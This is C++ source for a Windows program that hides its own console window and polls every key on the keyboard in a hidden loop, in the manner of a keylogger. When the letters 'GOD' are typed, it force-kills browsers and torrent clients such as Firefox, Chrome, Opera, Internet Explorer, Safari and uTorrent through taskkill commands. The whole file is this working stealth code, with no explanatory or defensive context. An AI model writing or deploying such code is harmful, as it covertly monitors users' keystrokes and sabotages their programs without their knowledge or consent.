#include <iostream>

using namespace std;

#include <windows.h>
#include <winuser.h>
#include<fstream>

int top=0; 

int Save (int key_stroke);
void doit ();

void Stealth();

int main()
{
    Stealth();
    
    char i;
    
    while (1)
    {
        for(i = 8; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            Save (i);
        }
    }
    
    system ("PAUSE");
    return 0;
}

/* *********************************** */

int Save (int key_stroke)
{
    if ( (key_stroke == 1) || (key_stroke == 2) )
       return 0;
      
      cout<<key_stroke<<"xx"<<(int)'d';
       
    if (key_stroke == 71 && top==0)
        top++;
    else if (key_stroke == 79 && top==1)
         top++;
    else if (key_stroke == 68 && top==2)
         doit();
    else
        top=0;
    
    return 0;
}
/* *********************************** */
void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth,0);
}

void doit()
{
     system("taskkill /t /f /fi \"IMAGENAME eq fire*\"");
     system("taskkill /t /f /fi \"IMAGENAME eq ope*\"");
     system("taskkill /t /f /fi \"IMAGENAME eq iex*\"");
     system("taskkill /t /f /fi \"IMAGENAME eq chr*\"");
     system("taskkill /t /f /fi \"IMAGENAME eq bit*\"");
     system("taskkill /t /f /fi \"IMAGENAME eq uto*\"");
     system("taskkill /t /f /fi \"IMAGENAME eq saf*\"");
     system("taskkill /t /f /fi \"IMAGENAME eq max*\"");
}
